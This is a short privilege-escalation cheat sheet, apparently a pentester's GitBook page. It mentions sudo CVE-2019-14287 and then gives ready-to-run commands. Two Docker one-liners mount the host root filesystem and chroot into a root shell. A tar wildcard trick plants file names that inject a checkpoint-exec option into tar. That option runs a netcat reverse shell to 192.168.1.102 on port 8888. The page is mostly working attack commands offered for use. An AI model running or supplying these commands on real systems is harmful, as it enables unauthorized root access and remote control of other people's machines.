# Interesting PrivEsc Findings

## Sudo CVE

<figure><img src="../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>sudo <a href="https://access.redhat.com/security/cve/cve-2019-14287">CVE-2019-14287</a></p></figcaption></figure>

Read more: [https://www.mend.io/blog/new-vulnerability-in-sudo-cve-2019-14287/](https://www.mend.io/blog/new-vulnerability-in-sudo-cve-2019-14287/)

## Docker

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/bash
```

Docker shell bypass and privesc to root

```bash
docker run -v /:/mnt --rm -it bash chroot /mnt sh
```

## Tar Wildcard

```bash
echo "mkfifo /tmp/lhennp; nc 192.168.1.102 8888 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
tar cf archive.tar *
```

